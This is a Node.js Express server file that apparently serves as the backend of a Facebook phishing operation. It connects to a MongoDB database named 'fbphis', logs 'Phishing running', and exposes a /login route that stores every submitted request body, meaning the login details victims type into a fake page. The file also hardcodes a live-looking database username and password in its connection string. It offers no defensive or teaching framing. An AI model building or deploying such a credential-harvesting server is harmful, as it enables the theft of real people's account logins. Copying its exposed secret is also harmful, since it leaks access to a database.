const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const port = process.env.PORT || 5000;
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const app = express();

app.use(express.json());
app.use(
  cors({
    origin: "*",
    methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
    credentials: true,
  })
);

app.use(cors());

dotenv.config();

const uri = `mongodb+srv://adanannaba01:t19PQb6wVuwYIAJ3@cluster0.bx1z9cc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    await client.connect(); // Ensure the MongoDB client is connected

    const accountCollection = client.db("fbphis").collection("account");

    app.get("/", (req, res) => {
      res.send("Phishing running");
    });

    app.post("/login", async (req, res) => {
      try {
        const request = req.body;
        const result = await accountCollection.insertOne(request);
        res.send(result);
      } catch (error) {
        console.error("Error in /login route:", error);
        res.status(500).send("An error occurred during login");
      }
    });

    console.log("MongoDB connection established");

    app.listen(port, () => {
      console.log("Phishing Running");
    });
  } catch (error) {
    console.error("Error during server initialization:", error);
  }
}

run().catch(console.dir);

app.listen(port, () => {
  console.log("Phising Running");
});
